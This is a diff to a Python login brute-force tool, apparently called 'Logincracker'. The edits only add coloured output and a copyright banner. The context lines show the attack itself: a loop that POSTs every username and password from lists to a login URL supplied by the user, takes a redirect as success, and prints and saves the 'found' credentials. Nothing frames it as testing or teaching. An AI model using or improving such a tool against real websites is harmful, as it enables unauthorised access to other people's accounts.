@@ -1,19 +1,21 @@
-import requests, time, random, sys
+import requests, time, random, sys, colorama
+from colorama import Fore
+colorama.init()
 counter = 0
 found = []
 speed = []
 start_program = True
 def banner():
-    print("""
+    print(f"""{Fore.GREEN}
      _                 _                           _             
     | |               (_)                         | |            
     | |     ___   __ _ _ _ __   ___ _ __ __ _  ___| | _____ _ __ 
     | |    / _ \ / _` | | '_ \ / __| '__/ _` |/ __| |/ / _ \ '__|
     | |___| (_) | (_| | | | | | (__| | | (_| | (__|   <  __/ |   
     |______\___/ \__, |_|_| |_|\___|_|  \__,_|\___|_|\_\___|_|   
-                  __/ |                                          
-                 |___/                                           
-    """)
+                  __/ |          [by LukeProducts]                                
+                 |___/       [© Copyright by LukeProducts]                                
+    {Fore.RESET}""")
 def help():
     print("usage:\npython gather_login.py [URL] [usernameindex] [passwordindex]")
 try:
@@ -76,9 +78,9 @@ def attack(url, usrind, passwdind, usr, passwd):
     try:
         r = requests.post(url, headers=header, data=data)
         if r.url != url:
-            print("*-----KEY FOUND!-----*")
+            print(f"{Fore.LIGHTCYAN_EX}*-----KEY FOUND!-----*")
             print(f"User:{username}, Passwd:{passwd}")
-            print("*-----KEY FOUND!-----*\n")
+            print(f"*-----KEY FOUND!-----*\n{Fore.RESET}")
             save_cracked(url, usrind, passwdind, usr, passwd)
             found.append(data)
         counter += 1
@@ -89,7 +91,7 @@ def attack(url, usrind, passwdind, usr, passwd):
         return False
 if start_program:
     banner()
-    print("processing... [the duration depends on the keys you've given]\n")
+    print(f"{Fore.RED}processing... [the duration depends on the keys you've given and complexity of the website]\n{Fore.RESET}")
     start = time.time()
     for username in username_list:
         for passwd in passwd_list:
